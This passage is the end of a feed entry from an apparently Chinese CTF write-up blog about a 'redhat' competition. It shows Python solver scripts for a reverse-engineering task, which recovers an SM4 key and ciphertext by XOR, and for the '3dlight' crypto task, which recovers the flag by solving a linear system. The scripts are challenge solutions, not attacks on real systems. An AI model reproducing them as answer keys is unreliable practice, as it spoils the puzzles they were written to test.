   <span class="number">0x61</span>,  <span class="number">0xf</span>,  <span class="number">0xff</span>,  <span class="number">0x14</span>,  <span class="number">0x6e</span>,  <span class="number">0x1c</span>,  <span class="number">0x48</span>,  <span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x79</span>,  <span class="number">0x9f</span>,  <span class="number">0x85</span>,  <span class="number">0xaf</span>,  <span class="number">0xc5</span>,  <span class="number">0x58</span>,  <span class="number">0xd</span>,  <span class="number">0xd6</span>,</span><br><span class="line">        <span class="number">0xa5</span>,  <span class="number">0xd9</span>,  <span class="number">0x64</span>,  <span class="number">0xfd</span>,  <span class="number">0x46</span>,  <span class="number">0x9</span>,  <span class="number">0x8c</span>,  <span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x3b</span>,  <span class="number">0xa5</span>,  <span class="number">0x37</span>,  <span class="number">0x62</span>,  <span class="number">0x5a</span>,  <span class="number">0xa6</span>,  <span class="number">0xd2</span>,  <span class="number">0x4b</span>,</span><br><span class="line">    ]</span><br><span class="line">    v9 = <span class="number">51</span></span><br><span class="line">    cipherText = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> v9 - <span class="number">51</span> &lt; <span class="number">48</span>:</span><br><span class="line">        cipherText += <span class="string">"&#123;:02x&#125;"</span>.format(secret[v9<span class="number">-51</span>] ^ v9)</span><br><span class="line">        v9 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cipherText.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = getKey().encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"key is &#123;&#125;"</span>.format(key)</span><br><span class="line">cipherText = getCipherText().encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"cipherText is &#123;&#125;"</span>.format(cipherText)</span><br><span class="line">sm4 = SM4(key=key)</span><br><span class="line">msg = sm4.sm4_decrypt(cipherText, SM4_ECB)</span><br><span class="line"><span class="keyword">print</span> msg.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h3 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>3dlight，当时就考虑用解多元一次方程组的方法来求解，当时搞不动了，后来抽空写了下生成系数矩阵的脚本，迎刃而解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2arr</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [[[(ord(str[i * <span class="number">8</span> + j]) &gt;&gt; k &amp; <span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2arr_rev</span><span class="params">(arr)</span>:</span></span><br><span class="line">    ret = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">            ret += chr(int(<span class="string">''</span>.join(map(str, arr[i][j][::<span class="number">-1</span>])), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arr2str</span><span class="params">(arr)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">                ret += chr(arr[i][j][k])</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arr2str_rev</span><span class="params">(str2)</span>:</span></span><br><span class="line">    ret = [[[<span class="number">0</span> <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">                ret[i][j][k] = ord(str2[i*<span class="number">64</span>+j*<span class="number">8</span>+k])</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt; <span class="number">7</span> <span class="keyword">or</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> y &gt; <span class="number">7</span> <span class="keyword">or</span> z &lt; <span class="number">0</span> <span class="keyword">or</span> z &gt; <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">light</span><span class="params">(arr, i, j, k, x, y, z, power)</span>:</span> <span class="comment"># square</span></span><br><span class="line">    <span class="keyword">if</span> check(i + x, j + y, k + z):</span><br><span class="line">        arr[i + x][j + y][k + z] += power  <span class="comment"># top right</span></span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">and</span> check(i - x, j + y, k + z):</span><br><span class="line">        arr[i - x][j + y][k + z] += power <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> y != <span class="number">0</span> <span class="keyword">and</span> check(i + x, j - y, k + z):</span><br><span class="line">        arr[i + x][j - y][k + z] += power</span><br><span class="line">    <span class="keyword">if</span> z != <span class="number">0</span> <span class="keyword">and</span> check(i + x, j + y, k - z):</span><br><span class="line">        arr[i + x][j + y][k - z] += power</span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">and</span> y != <span class="number">0</span> <span class="keyword">and</span> check(i - x, j - y, k + z):</span><br><span class="line">        arr[i - x][j - y][k + z] += power</span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">and</span> z != <span class="number">0</span> <span class="keyword">and</span> check(i - x, j + y, k - z):</span><br><span class="line">        arr[i - x][j + y][k - z] += power</span><br><span class="line">    <span class="keyword">if</span> y != <span class="number">0</span> <span class="keyword">and</span> z != <span class="number">0</span> <span class="keyword">and</span> check(i + x, j - y, k - z):</span><br><span class="line">        arr[i + x][j - y][k - z] += power</span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">0</span> <span class="keyword">and</span> y != <span class="number">0</span> <span class="keyword">and</span> z != <span class="number">0</span> <span class="keyword">and</span> check(i - x, j - y, k - z):</span><br><span class="line">        arr[i - x][j - y][k - z] += power</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(flag, power)</span>:</span></span><br><span class="line">    ret = [[[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">8</span>)]</span><br><span class="line">    lights = str2arr(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">if</span> lights[i][j][k] == <span class="number">1</span>: <span class="comment"># bit is 1</span></span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> range(power):</span><br><span class="line">                        <span class="keyword">for</span> y <span class="keyword">in</span> range(power - x):</span><br><span class="line">                            <span class="keyword">for</span> z <span class="keyword">in</span> range(power - x - y):</span><br><span class="line">                                light(ret, i, j, k, x, y, z, power - x - y - z)</span><br><span class="line">    <span class="keyword">return</span> arr2str(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMatrix</span><span class="params">()</span>:</span></span><br><span class="line">    A = [[ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>**<span class="number">3</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>**<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(len(A)):</span><br><span class="line">        ord_x = row / <span class="number">8</span>**<span class="number">2</span></span><br><span class="line">        ord_y = (row - ord_x*(<span class="number">8</span>**<span class="number">2</span>))/<span class="number">8</span></span><br><span class="line">        ord_z = row % <span class="number">8</span></span><br><span class="line">        A[row][ord_x * <span class="number">8</span>**<span class="number">2</span> + ord_y * <span class="number">8</span> + ord_z] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> ord_x &gt; <span class="number">0</span>:</span><br><span class="line">            A[row][(ord_x<span class="number">-1</span>)* <span class="number">8</span>**<span class="number">2</span> + ord_y*<span class="number">8</span> + ord_z] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_x &lt; <span class="number">7</span>:</span><br><span class="line">            A[row][(ord_x+<span class="number">1</span>)* <span class="number">8</span>**<span class="number">2</span> + ord_y*<span class="number">8</span> + ord_z] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_y &gt; <span class="number">0</span>:</span><br><span class="line">            A[row][ord_x* <span class="number">8</span>**<span class="number">2</span> + (ord_y<span class="number">-1</span>) *<span class="number">8</span> + ord_z] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_y &lt; <span class="number">7</span>:</span><br><span class="line">            A[row][ord_x* <span class="number">8</span>**<span class="number">2</span> + (ord_y+<span class="number">1</span>) *<span class="number">8</span> + ord_z] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_z &gt; <span class="number">0</span>:</span><br><span class="line">            A[row][ord_x * <span class="number">8</span>**<span class="number">2</span> + ord_y * <span class="number">8</span> + ord_z <span class="number">-1</span> ] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ord_z &lt; <span class="number">7</span>:</span><br><span class="line">            A[row][ord_x * <span class="number">8</span>**<span class="number">2</span> + ord_y * <span class="number">8</span> + ord_z + <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> np.array(A)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">"flag&#123;abcdefg_hij_klm_nop_qrst_uvwxyz_0123456789_1234567890__xyz&#125;"</span></span><br><span class="line">    shuffle_flag = <span class="string">''</span>.join(flag[<span class="number">0</span>::<span class="number">2</span>][i] + flag[<span class="number">-1</span>::<span class="number">-2</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>))</span><br><span class="line">    cipher = encrypt(shuffle_flag, <span class="number">2</span>)</span><br><span class="line">    CipherArr =arr2str_rev(cipher)</span><br><span class="line">    <span class="keyword">return</span> np.array(CipherArr).flatten()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></span><br><span class="line">    solvea = np.linalg.solve(getMatrix(), getCipher())</span><br><span class="line">    t = []</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> solvea:</span><br><span class="line">        <span class="keyword">if</span> abs(a) &lt; <span class="number">0.0001</span>:</span><br><span class="line">            t.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t.append(<span class="number">1</span>)</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(t), <span class="number">8</span>):</span><br><span class="line">        flag += chr(int(<span class="string">''</span>.join(map(str, t[i:i+<span class="number">8</span>]))[::<span class="number">-1</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(flag[<span class="number">0</span>::<span class="number">2</span>][i] + flag[<span class="number">-1</span>::<span class="number">-2</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> decrypt()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;熬了一天，感觉pwn和re的水平退步不少。&lt;/p&gt;
&lt;h3 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h3&gt;&lt;p&gt;这次比赛中的pwn的题目难度一般，3个pwn分别涉及到&lt;/p&gt;
&lt;ul&gt;

      
    
    </summary>
    
      <category term="ctf" scheme="https://skysider.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://skysider.github.io/tags/ctf/"/>
    
      <category term="redhat" scheme="https://skysider.github.io/tags/redhat/"/>
    
      <category term="pwn" scheme="https://skysider.github.io/tags/pwn/"/>
    
      <category term="reverse" scheme="https://skysider.github.io/tags/reverse/"/>
    
      <category term="crypto" scheme="https://skysider.github.io/tags/crypto/"/>
    
  </entry>
  
</feed>
